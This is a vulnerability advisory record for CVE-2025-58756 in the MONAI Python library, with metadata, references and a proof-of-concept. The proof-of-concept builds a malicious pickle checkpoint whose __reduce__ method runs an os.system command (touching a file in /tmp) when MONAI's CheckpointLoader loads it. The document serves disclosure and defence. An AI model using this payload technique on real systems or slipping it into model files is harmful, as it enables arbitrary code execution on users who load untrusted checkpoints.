advisory_id: pypi/monai/CVE-2025-58756
datasource_id: gitlab_importer_v2/pypi/monai/CVE-2025-58756
datasource_url: https://gitlab.com/gitlab-org/advisories-community/-/blob/main/pypi/monai/CVE-2025-58756.yml
aliases:
  - CVE-2025-58756
  - GHSA-6vm5-6jv9-rjpj
summary: |
  MONAI: Unsafe torch usage may lead to arbitrary code execution
  In ```model_dict = torch.load(full_path, map_location=torch.device(device), weights_only=True)``` in monai/bundle/scripts.py , ```weights_only=True``` is loaded securely. However, insecure loading methods still exist elsewhere in the project, such as when loading checkpoints.

  This is a common practice when users want to reduce training time and costs by loading pre-trained models downloaded from platforms like huggingface.

  Loading a checkpoint containing malicious content can trigger a deserialization vulnerability, leading to code execution.

  The following proof-of-concept demonstrates the issues that arise when loading insecure checkpoints.

  ```

  import os
  import tempfile
  import json
  import torch
  from pathlib import Path

  class MaliciousPayload:
  def __reduce__(self):
  return (os.system, ('touch /tmp/hacker2.txt',))

  def test_checkpoint_loader_attack():



  temp_dir = Path(tempfile.mkdtemp())
  checkpoint_file = temp_dir / "malicious_checkpoint.pt"


  malicious_checkpoint = {
  'model_state_dict': MaliciousPayload(),
  'optimizer_state_dict': {},
  'epoch': 100
  }


  torch.save(malicious_checkpoint, checkpoint_file)


  from monai.handlers import CheckpointLoader
  import torch.nn as nn


  model = nn.Linear(10, 1)

  loader = CheckpointLoader(
  load_path=str(checkpoint_file),
  load_dict={"model": model}
  )

  class MockEngine:
  def __init__(self):
  self.state = type('State', (), {})()
  self.state.max_epochs = None
  self.state.epoch = 0

  engine = MockEngine()
  loader(engine)


  proof_file = "/tmp/hacker2.txt"
  if os.path.exists(proof_file):
  print("Succes")
impacted_packages:
  - purl: pkg:pypi/monai
    affected_versions: vers:pypi/<1.5.1
    fixed_versions: vers:pypi/1.5.1
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score:
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    published_at: None
    url: https://gitlab.com/gitlab-org/advisories-community/-/blob/main/pypi/monai/CVE-2025-58756.yml
weaknesses:
  - CWE-1035
  - CWE-502
  - CWE-937
references:
  - url: https://github.com/Project-MONAI/MONAI
    reference_type:
    reference_id:
  - url: https://github.com/Project-MONAI/MONAI/commit/948fbb703adcb87cd04ebd83d20dcd8d73bf6259
    reference_type:
    reference_id:
  - url: https://github.com/Project-MONAI/MONAI/pull/8566
    reference_type:
    reference_id:
  - url: https://github.com/Project-MONAI/MONAI/security/advisories/GHSA-6vm5-6jv9-rjpj
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-58756
    reference_type:
    reference_id:
  - url: https://github.com/advisories/GHSA-6vm5-6jv9-rjpj
    reference_type:
    reference_id: GHSA-6vm5-6jv9-rjpj
